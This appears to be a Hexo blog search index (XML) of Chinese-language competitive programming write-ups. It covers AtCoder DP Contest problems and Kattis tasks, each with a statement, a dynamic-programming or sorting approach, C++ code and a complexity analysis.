<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>Atcoder DP Contest pA</title>
    <url>/2020/06/26/Atcoder%20DP%20Contest%20pA/</url>
    <content><![CDATA[<h1 id="Atcoder-DP-Contest-pA"><a href="#Atcoder-DP-Contest-pA" class="headerlink" title="Atcoder DP Contest pA"></a>Atcoder DP Contest pA</h1><h2 id="題敘"><a href="#題敘" class="headerlink" title="題敘"></a>題敘</h2><p><a href="https://atcoder.jp/contests/dp/tasks/dp_a" target="_blank" rel="noopener">https://atcoder.jp/contests/dp/tasks/dp_a</a><br>跳到第 $i$ 格的方法有兩種</p>
<ul>
<li>從 $i-1$ 格跳，花費 $\mid arr[i]-arr[i-1] \mid$</li>
<li>從 $i-2$ 格跳，花費 $\mid arr[i]-arr[i-2] \mid$</li>
</ul>
<p>求跳到第 $n$ 格的最小花費</p>
<h2 id="想法"><a href="#想法" class="headerlink" title="想法"></a>想法</h2><p>對於每個格子 $i$ 只能從 $i-1$ 和 $i-2$ 轉移過來，因此只需要判斷從誰走過來最小就能保證會是最佳解<br>定義 $DP[i]$ 表示第 $i$ 格的最小花費<br>則有轉移式 $DP[i] = min(DP[i-1] + \mid arr[i]-arr[i-1] \mid,\  DP[i-2] + \mid arr[i]-arr[i-2] \mid)$<br>且 $DP[0] = 0, DP[1] = abs(arr[1]-arr[0])$</p>
<h2 id="Code"><a href="#Code" class="headerlink" title="Code"></a>Code</h2><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="comment">//By Koios1143</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> LL long long</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> IOS ios::sync_with_stdio(false),cin.tie(0),cout.tie(0);</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> pii pair<span class="meta-string">&lt;int,int&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="keyword">const</span> <span class="keyword">int</span> MaxN = <span class="number">100005</span>;</span><br><span class="line"><span class="keyword">int</span> n,arr[MaxN],dp[MaxN];</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">	IOS</span><br><span class="line">	<span class="keyword">while</span>(<span class="built_in">cin</span>&gt;&gt;n)&#123;</span><br><span class="line">		<span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span> ; i&lt;n ; i++)&#123;</span><br><span class="line">			<span class="built_in">cin</span>&gt;&gt;arr[i];</span><br><span class="line">		&#125;</span><br><span class="line">		dp[<span class="number">0</span>]=<span class="number">0</span>;</span><br><span class="line">		dp[<span class="number">1</span>]=<span class="built_in">abs</span>(arr[<span class="number">0</span>]-arr[<span class="number">1</span>]);</span><br><span class="line">		<span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">2</span> ; i&lt;n ; i++)&#123;</span><br><span class="line">			dp[i]=min(dp[i<span class="number">-1</span>]+<span class="built_in">abs</span>(arr[i]-arr[i<span class="number">-1</span>]), dp[i<span class="number">-2</span>]+<span class="built_in">abs</span>(arr[i]-arr[i<span class="number">-2</span>]));</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="built_in">cout</span>&lt;&lt;dp[n<span class="number">-1</span>]&lt;&lt;<span class="string">"\n"</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="複雜度"><a href="#複雜度" class="headerlink" title="複雜度"></a>複雜度</h2><p>有 $n$ 種狀態，每種狀態的轉移複雜度為 $O(1)$<br>總複雜度 $O(n)$</p>
]]></content>
      <categories>
        <category>AtCoder</category>
      </categories>
      <tags>
        <tag>AtCoder</tag>
        <tag>DP</tag>
      </tags>
  </entry>
  <entry>
    <title>Atcoder DP Contest pE</title>
    <url>/2020/06/26/Atcoder%20DP%20Contest%20pE/</url>
    <content><![CDATA[<h1 id="Atcoder-DP-Contest-pE"><a href="#Atcoder-DP-Contest-pE" class="headerlink" title="Atcoder DP Contest pE"></a>Atcoder DP Contest pE</h1><h2 id="題敘"><a href="#題敘" class="headerlink" title="題敘"></a>題敘</h2><p><a href="https://atcoder.jp/contests/dp/tasks/dp_e" target="_blank" rel="noopener">https://atcoder.jp/contests/dp/tasks/dp_e</a><br>與pD相同，但是重量可以來到 $10^9$<br>問最大價值</p>
<h2 id="想法"><a href="#想法" class="headerlink" title="想法"></a>想法</h2><p>因為重量太大了，導致無法使用pD的作法<br>但是價值不大，可以從這裡下手<br>將問題倒過來思考，如果知道在某價值下最小的重量總和，那麼只要重量總和小於等於題目要求，那麼該價值的最大值即為解</p>
<p>定義 $DP[i]$ 表示在價值為 $i$ 時的最小重量總和<br>則有轉移式 $DP[i] = min(dp[i], dp[i-value[j]]+cost[j])$<br>且已知 $dp[0] = 0$</p>
<h2 id="Code"><a href="#Code" class="headerlink" title="Code"></a>Code</h2><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="comment">//By Koios1143</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> LL long long</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> IOS ios::sync_with_stdio(false),cin.tie(0),cout.tie(0);</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> pii pair<span class="meta-string">&lt;int,int&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="keyword">const</span> <span class="keyword">int</span> MaxN = <span class="number">105</span>,MaxV = <span class="number">100005</span>;</span><br><span class="line"><span class="keyword">int</span> n,w,cost[MaxN],value[MaxN];</span><br><span class="line"><span class="keyword">long</span> <span class="keyword">long</span> dp[MaxV];</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">	IOS</span><br><span class="line">	<span class="keyword">while</span>(<span class="built_in">cin</span>&gt;&gt;n&gt;&gt;w)&#123;</span><br><span class="line">		<span class="keyword">int</span> tot_value=<span class="number">0</span>;</span><br><span class="line">		<span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span> ; i&lt;n ; i++)&#123;</span><br><span class="line">			<span class="built_in">cin</span>&gt;&gt;cost[i]&gt;&gt;value[i];</span><br><span class="line">			tot_value+=value[i];</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span> ; i&lt;=tot_value ; i++)&#123;</span><br><span class="line">			dp[i] = INT_MAX;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span> ; i&lt;n ; i++)&#123;</span><br><span class="line">			<span class="keyword">for</span>(<span class="keyword">int</span> j=tot_value ; j&gt;=value[i] ; j--)&#123;</span><br><span class="line">				dp[j]=min(dp[j], dp[j-value[i]]+cost[i]);</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">int</span> ans=<span class="number">0</span>;</span><br><span class="line">		<span class="keyword">for</span>(<span class="keyword">int</span> i=tot_value ; i&gt;<span class="number">0</span> ; i--)&#123;</span><br><span class="line">			<span class="keyword">if</span>(dp[i]&lt;=w)&#123;</span><br><span class="line">				ans=i;</span><br><span class="line">				<span class="keyword">break</span>;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="built_in">cout</span>&lt;&lt;ans&lt;&lt;<span class="string">"\n"</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="複雜度"><a href="#複雜度" class="headerlink" title="複雜度"></a>複雜度</h2><p>有 $NV$ 種狀態，每種狀態轉移複雜度為 $O(1)$<br>輸出複雜度也為 $O(NV)$<br>總複雜度 $O(NV)$</p>
]]></content>
      <categories>
        <category>AtCoder</category>
      </categories>
      <tags>
        <tag>AtCoder</tag>
        <tag>DP</tag>
        <tag>Backpack</tag>
      </tags>
  </entry>
  <entry>
    <title>Atcoder DP Contest pF</title>
    <url>/2020/06/26/Atcoder%20DP%20Contest%20pF/</url>
    <content><![CDATA[<h1 id="Atcoder-DP-Contest-pF"><a href="#Atcoder-DP-Contest-pF" class="headerlink" title="Atcoder DP Contest pF"></a>Atcoder DP Contest pF</h1><h2 id="題敘"><a href="#題敘" class="headerlink" title="題敘"></a>題敘</h2><p><a href="https://atcoder.jp/contests/dp/tasks/dp_f" target="_blank" rel="noopener">https://atcoder.jp/contests/dp/tasks/dp_f</a><br>給兩個字串，問兩字串的LCS，並輸出最大的LCS</p>
<h2 id="想法"><a href="#想法" class="headerlink" title="想法"></a>想法</h2><p>把兩個字串拆成:</p>
<blockquote>
<p>s = sub1 + e1<br>t = sub2 + e2</p>
</blockquote>
<p>另$LCS(i,j)$ 表示 $s[0<del>i]$ 和 $t[0</del>j]$ 的LCS長度<br>分成四種情況討論</p>
<ol>
<li>LCS包含 $e1$ ，不含 $e2$<br> $LCS(s,t) = LCS(s,sub2)$</li>
<li>LCS包含 $e1$ ，包含 $e2$<br> $LCS(s,t) = LCS(sub1,sub2)+1$</li>
<li>LCS不含 $e1$ ，不含 $e2$<br> $LCS(s,t) = LCS(sub1,sub2)$</li>
<li>LCS不含 $e1$ ，包含 $e2$<br> $LCS(s,t) = LCS(sub1,t)$</li>
</ol>
<p>總的來說，定義 $DP[i][j]$ 表示$LCS(i,j)$的長度<br>則有轉移式<br>$DP[i][j] = DP[i-1][j-1]+1\ ,s[i]=t[j]$<br>$DP[i][j] = max(DP[i-1][j], DP[i],[j-1])\ ,s[i] \neq t[j]$<br>且已知<br>$DP[i][0] = 0, DP[0][j] = 0$</p>
<p>這邊能獲得的僅僅是LCS長度，但題目所求的是字串<br>可以另外開一個陣列紀錄他是從哪裡轉移過來，最後遞迴輸出結果即可</p>
<h2 id="Code"><a href="#Code" class="headerlink" title="Code"></a>Code</h2><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="comment">//By Koios1143</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> LL long long</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> IOS ios::sync_with_stdio(false),cin.tie(0),cout.tie(0);</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> pii pair<span class="meta-string">&lt;int,int&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="built_in">string</span> s,t;</span><br><span class="line"><span class="keyword">int</span> dp[<span class="number">3005</span>][<span class="number">3005</span>],from[<span class="number">3005</span>][<span class="number">3005</span>];</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">print_LCS</span><span class="params">(<span class="keyword">int</span> i,<span class="keyword">int</span> j)</span></span>&#123;</span><br><span class="line">	<span class="keyword">if</span>(i==<span class="number">0</span> || j==<span class="number">0</span>)</span><br><span class="line">		<span class="keyword">return</span>;</span><br><span class="line">	<span class="keyword">if</span>(from[i][j] == <span class="number">0</span>)&#123;</span><br><span class="line">		print_LCS(i<span class="number">-1</span>,j<span class="number">-1</span>);</span><br><span class="line">		<span class="built_in">cout</span>&lt;&lt;s[i<span class="number">-1</span>];</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">else</span> <span class="keyword">if</span>(from[i][j] == <span class="number">1</span>)</span><br><span class="line">		print_LCS(i<span class="number">-1</span>,j);</span><br><span class="line">	<span class="keyword">else</span></span><br><span class="line">		print_LCS(i,j<span class="number">-1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">	IOS</span><br><span class="line">	<span class="keyword">while</span>(<span class="built_in">cin</span>&gt;&gt;s&gt;&gt;t)&#123;</span><br><span class="line">		<span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span> ; i&lt;<span class="number">3005</span> ; i++)&#123;</span><br><span class="line">			dp[i][<span class="number">0</span>] = dp[<span class="number">0</span>][i] = <span class="number">0</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span> ; i&lt;=s.size() ; i++)&#123;</span><br><span class="line">			<span class="keyword">for</span>(<span class="keyword">int</span> j=<span class="number">1</span> ; j&lt;=t.size() ; j++)&#123;</span><br><span class="line">				<span class="keyword">if</span>(s[i<span class="number">-1</span>] == t[j<span class="number">-1</span>])&#123;</span><br><span class="line">					dp[i][j] = dp[i<span class="number">-1</span>][j<span class="number">-1</span>]+<span class="number">1</span>;</span><br><span class="line">					from[i][j]=<span class="number">0</span>;</span><br><span class="line">				&#125;</span><br><span class="line">				<span class="keyword">else</span>&#123;</span><br><span class="line">					<span class="keyword">if</span>(dp[i<span class="number">-1</span>][j] &gt; dp[i][j<span class="number">-1</span>])</span><br><span class="line">						from[i][j]=<span class="number">1</span>;</span><br><span class="line">					<span class="keyword">else</span></span><br><span class="line">						from[i][j]=<span class="number">2</span>;</span><br><span class="line">					dp[i][j] = max(dp[i<span class="number">-1</span>][j], dp[i][j<span class="number">-1</span>]);</span><br><span class="line">				&#125;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">		print_LCS(s.size(),t.size());</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="複雜度"><a href="#複雜度" class="headerlink" title="複雜度"></a>複雜度</h2><p>有 $len(s)*len(t)$ 種狀態，每種狀態轉移時間複雜度為 $O(1)$<br>DP複雜度為 $O(len(s)*len(t))$<br>輸出複雜度大約為 $O(len(s)+len(t))$<br>總複雜度 $O(len(s)*len(t))$</p>
]]></content>
      <categories>
        <category>AtCoder</category>
      </categories>
      <tags>
        <tag>AtCoder</tag>
        <tag>DP</tag>
        <tag>LCS</tag>
      </tags>
  </entry>
  <entry>
    <title>Atcoder DP Contest pG</title>
    <url>/2020/06/26/Atcoder%20DP%20Contest%20pG/</url>
    <content><![CDATA[<h1 id="Atcoder-DP-Contest-pG"><a href="#Atcoder-DP-Contest-pG" class="headerlink" title="Atcoder DP Contest pG"></a>Atcoder DP Contest pG</h1><h2 id="題敘"><a href="#題敘" class="headerlink" title="題敘"></a>題敘</h2><p><a href="https://atcoder.jp/contests/dp/tasks/dp_g" target="_blank" rel="noopener">https://atcoder.jp/contests/dp/tasks/dp_g</a><br>給一張有向無環圖$G$，求最長路徑大小</p>
<h2 id="想法"><a href="#想法" class="headerlink" title="想法"></a>想法</h2><p>直接DFS每個點是從哪些點轉移過來<br>將答案直接儲存在點上，當已經有答案時直接回傳，就跟DP的概念一樣<br>定義 $DP[i]$ 表示點 $i$ 為終點時的最長路徑<br>則有轉移式 $DP[i] = max(DP[k]+1)$，其中 $k$ 表示所有走向點 $i$ 的點</p>
<h2 id="Code"><a href="#Code" class="headerlink" title="Code"></a>Code</h2><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="comment">//By Koios1143</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> LL long long</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> IOS ios::sync_with_stdio(false),cin.tie(0),cout.tie(0);</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> pii pair<span class="meta-string">&lt;int,int&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">dot</span>&#123;</span></span><br><span class="line">	<span class="keyword">int</span> val=<span class="number">0</span>;</span><br><span class="line">	<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt; from;</span><br><span class="line">&#125;dots[<span class="number">100005</span>];</span><br><span class="line"><span class="keyword">int</span> n,m;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">dfs</span><span class="params">(<span class="keyword">int</span> px)</span></span>&#123;</span><br><span class="line">	<span class="keyword">if</span>(dots[px].from.empty())</span><br><span class="line">		<span class="keyword">return</span> dots[px].val=<span class="number">0</span>;</span><br><span class="line">	<span class="keyword">if</span>(dots[px].val)</span><br><span class="line">		<span class="keyword">return</span> dots[px].val;</span><br><span class="line">	<span class="keyword">int</span> res=<span class="number">0</span>;</span><br><span class="line">	<span class="keyword">for</span>(<span class="keyword">auto</span> i: dots[px].from)&#123;</span><br><span class="line">		res=max(res,dfs(i));</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> dots[px].val=res+<span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">	IOS</span><br><span class="line">	<span class="keyword">while</span>(<span class="built_in">cin</span>&gt;&gt;n&gt;&gt;m)&#123;</span><br><span class="line">		<span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>,a,b ; i&lt;m ; i++)&#123;</span><br><span class="line">			<span class="built_in">cin</span>&gt;&gt;a&gt;&gt;b;</span><br><span class="line">			dots[b].from.push_back(a);</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">int</span> ans=<span class="number">0</span>;</span><br><span class="line">		<span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span> ; i&lt;=n ; i++)&#123;</span><br><span class="line">			ans=max(ans,dfs(i));</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="built_in">cout</span>&lt;&lt;ans&lt;&lt;<span class="string">"\n"</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="複雜度"><a href="#複雜度" class="headerlink" title="複雜度"></a>複雜度</h2><p>DFS過程會遍歷每個點和邊，且都只會遍歷一次，總複雜度 $O(N+M)$</p>
]]></content>
      <categories>
        <category>AtCoder</category>
      </categories>
      <tags>
        <tag>AtCoder</tag>
        <tag>DP</tag>
        <tag>Longest Path</tag>
      </tags>
  </entry>
  <entry>
    <title>Kattis - Bus Numbers</title>
    <url>/2021/03/23/Kattis%20Bus%20Numbers/</url>
    <content><![CDATA[<h1 id="Kattis-Bus-Numbers"><a href="#Kattis-Bus-Numbers" class="headerlink" title="Kattis - Bus Numbers"></a>Kattis - Bus Numbers</h1><h2 id="題目"><a href="#題目" class="headerlink" title="題目"></a>題目</h2><p><a href="https://open.kattis.com/problems/busnumbers" target="_blank" rel="noopener">https://open.kattis.com/problems/busnumbers</a></p>
<p>給一個序列，如果有連續遞增 $1$ 的子序列 $a_i$ ~ $a_j$ 長度超過 $2$ ，那麼就可以化簡成 <code>a_i-a_j</code></p>
<p>否則正常輸出每個數字</p>
<p>例如有一個序列 $(141, 142, 143, 145)$ 經過化簡後會變成 <code>141-143 145</code></p>
<h2 id="想法"><a href="#想法" class="headerlink" title="想法"></a>想法</h2><p>可以化簡的是連續遞增的序列，那麼很容易可以想到先將序列排序</p>
<p>排序之後檢查每個連續的子序列長度，若超過 $2$ 就輸出化簡的結果，否則正常輸出即可</p>
<h2 id="Code"><a href="#Code" class="headerlink" title="Code"></a>Code</h2><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="comment">//By Koios1143</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;algorithm&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">	<span class="keyword">int</span> n, arr[<span class="number">1010</span>];</span><br><span class="line">	<span class="keyword">bool</span> out=<span class="literal">false</span>;</span><br><span class="line">	<span class="built_in">cin</span>&gt;&gt;n;</span><br><span class="line">	<span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span> ; i&lt;n ; i++)&#123;</span><br><span class="line">		<span class="built_in">cin</span>&gt;&gt;arr[i];</span><br><span class="line">	&#125;</span><br><span class="line">	sort(arr, arr+n);</span><br><span class="line">	<span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>, cnt=<span class="number">1</span> ; i&lt;=n ; i++)&#123;</span><br><span class="line">		<span class="comment">// 當 i==n 時是看到最後一個元素的時候</span></span><br><span class="line">		<span class="comment">// 此時直接進入輸出階段</span></span><br><span class="line">		<span class="keyword">if</span>(arr[i]<span class="number">-1</span> == arr[i<span class="number">-1</span>] &amp;&amp; i!=n)&#123;</span><br><span class="line">			cnt++;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">else</span>&#123;</span><br><span class="line">			<span class="comment">// 輸出之間要有空隔間格</span></span><br><span class="line">			<span class="keyword">if</span>(out) <span class="built_in">cout</span>&lt;&lt;<span class="string">" "</span>;</span><br><span class="line">			<span class="keyword">else</span> out=<span class="literal">true</span>;</span><br><span class="line">			</span><br><span class="line">			<span class="keyword">if</span>(cnt&gt;<span class="number">2</span>)&#123;</span><br><span class="line">				<span class="comment">// 輸出化簡的結果</span></span><br><span class="line">				<span class="built_in">cout</span>&lt;&lt;arr[i-cnt]&lt;&lt;<span class="string">"-"</span>&lt;&lt;arr[i<span class="number">-1</span>];</span><br><span class="line">			&#125;</span><br><span class="line">			<span class="keyword">else</span> <span class="keyword">if</span>(cnt==<span class="number">2</span>)&#123;</span><br><span class="line">				<span class="comment">// 長度剛好為 2，將兩個元素都正常輸出</span></span><br><span class="line">				<span class="built_in">cout</span>&lt;&lt;arr[i<span class="number">-2</span>]&lt;&lt;<span class="string">" "</span>&lt;&lt;arr[i<span class="number">-1</span>];</span><br><span class="line">			&#125;</span><br><span class="line">			<span class="keyword">else</span>&#123;</span><br><span class="line">				<span class="built_in">cout</span>&lt;&lt;arr[i<span class="number">-1</span>];</span><br><span class="line">			&#125;</span><br><span class="line">			cnt=<span class="number">1</span>;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="built_in">cout</span>&lt;&lt;<span class="string">'\n'</span>;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="複雜度分析"><a href="#複雜度分析" class="headerlink" title="複雜度分析"></a>複雜度分析</h2><p>輸入時間複雜度為 $O(n)$</p>
<p>排序時間複雜度為 $O(nlogn)$</p>
<p>遍歷時間複雜度為 $O(n)$</p>
<p>總時間複雜度為 $O(n + nlogn)$</p>
]]></content>
      <categories>
        <category>Kattis</category>
      </categories>
      <tags>
        <tag>Kattis</tag>
        <tag>Sort</tag>
      </tags>
  </entry>
  <entry>
    <title>Atcoder DP Contest pH</title>
    <url>/2020/06/26/Atcoder%20DP%20Contest%20pH/</url>
    <content><![CDATA[<h1 id="Atcoder-DP-Contest-pH"><a href="#Atcoder-DP-Contest-pH" class="headerlink" title="Atcoder DP Contest pH"></a>Atcoder DP Contest pH</h1><h2 id="題敘"><a href="#題敘" class="headerlink" title="題敘"></a>題敘</h2><p><a href="https://atcoder.jp/contests/dp/tasks/dp_h" target="_blank" rel="noopener">https://atcoder.jp/contests/dp/tasks/dp_h</a><br>給一張二維圖，圖上有障礙物，問從點 $(1,1)$ 走到點 $(h,w)$ 的方法數模 $10^9+7$ 為多少</p>
<h2 id="想法"><a href="#想法" class="headerlink" title="想法"></a>想法</h2><p>跟走樓梯的DP概念相同<br>同一個格子只能從左邊或上面轉移過來，則方法數會是兩者相加<br>定義 $DP[i][j]$ 表示在第 $(i,j)$ 格的方法數<br>則有轉移式 $DP[i][j] = DP[i-1][j] = DP[i][j-1]$<br>且已知 $DP[1][1] = 1$</p>
<h2 id="Code"><a href="#Code" class="headerlink" title="Code"></a>Code</h2><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="comment">//By Koios1143</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> LL long long</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> IOS ios::sync_with_stdio(false),cin.tie(0),cout.tie(0);</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> pii pair<span class="meta-string">&lt;int,int&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="keyword">const</span> <span class="keyword">int</span> Mod=<span class="number">1e9</span>+<span class="number">7</span>;</span><br><span class="line"><span class="keyword">int</span> h,w;</span><br><span class="line"><span class="keyword">char</span> arr[<span class="number">1005</span>][<span class="number">1005</span>];</span><br><span class="line"><span class="keyword">long</span> <span class="keyword">long</span> dp[<span class="number">1005</span>][<span class="number">1005</span>];</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">	IOS</span><br><span class="line">	<span class="keyword">while</span>(<span class="built_in">cin</span>&gt;&gt;h&gt;&gt;w)&#123;</span><br><span class="line">		<span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span> ; i&lt;h ; i++)&#123;</span><br><span class="line">			<span class="keyword">for</span>(<span class="keyword">int</span> j=<span class="number">0</span> ; j&lt;w ; j++)&#123;</span><br><span class="line">				<span class="built_in">cin</span>&gt;&gt;arr[i][j];</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="built_in">memset</span>(dp,<span class="number">0</span>,<span class="keyword">sizeof</span>(dp));</span><br><span class="line">		dp[<span class="number">1</span>][<span class="number">1</span>]=<span class="number">1</span>;</span><br><span class="line">		<span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span> ; i&lt;=h ; i++)&#123;</span><br><span class="line">			<span class="keyword">for</span>(<span class="keyword">int</span> j=<span class="number">1</span> ; j&lt;=w ; j++)&#123;</span><br><span class="line">				<span class="keyword">if</span>(arr[i<span class="number">-1</span>][j<span class="number">-1</span>]==<span class="string">'#'</span>)</span><br><span class="line">					<span class="keyword">continue</span>;</span><br><span class="line">				dp[i][j] += (dp[i][j<span class="number">-1</span>] + dp[i<span class="number">-1</span>][j])%Mod;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="built_in">cout</span>&lt;&lt;dp[h][w]%Mod&lt;&lt;<span class="string">"\n"</span>;</span><br><span class="line">	&#125;	</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="複雜度"><a href="#複雜度" class="headerlink" title="複雜度"></a>複雜度</h2><p>有 $hw$ 種狀態，每種狀態轉移複雜度為 $O(1)$<br>總複雜度 $O(hw)$</p>
]]></content>
      <categories>
        <category>AtCoder</category>
      </categories>
      <tags>
        <tag>AtCoder</tag>
        <tag>DP</tag>
      </tags>
  </entry>
  <entry>
    <title>Kattis - Oddities</title>
    <url>/2021/03/23/Kattis%20Oddities/</url>
    <content><![CDATA[<h1 id="Kattis-Oddities"><a href="#Kattis-Oddities" class="headerlink" title="Kattis - Oddities"></a>Kattis - Oddities</h1><h2 id="題目"><a href="#題目" class="headerlink" title="題目"></a>題目</h2><p><a href="https://hackmd.io/@sa072686/Kattis_oddities" target="_blank" rel="noopener">https://hackmd.io/@sa072686/Kattis_oddities</a></p>
<p><a href="https://open.kattis.com/problems/oddities" target="_blank" rel="noopener">https://open.kattis.com/problems/oddities</a></p>
<p>判斷 $n$ 是奇數或是偶數</p>
<h2 id="Code"><a href="#Code" class="headerlink" title="Code"></a>Code</h2><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="comment">//By Koios1143</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">	<span class="keyword">int</span> n,x;</span><br><span class="line">	<span class="built_in">cin</span>&gt;&gt;n;</span><br><span class="line">	<span class="keyword">while</span>(n--)&#123;</span><br><span class="line">		<span class="built_in">cin</span>&gt;&gt;x;</span><br><span class="line">		<span class="keyword">if</span>(x%<span class="number">2</span>==<span class="number">0</span>)</span><br><span class="line">			<span class="built_in">cout</span>&lt;&lt;x&lt;&lt;<span class="string">" is even\n"</span>;</span><br><span class="line">		<span class="keyword">else</span></span><br><span class="line">			<span class="built_in">cout</span>&lt;&lt;x&lt;&lt;<span class="string">" is odd\n"</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span 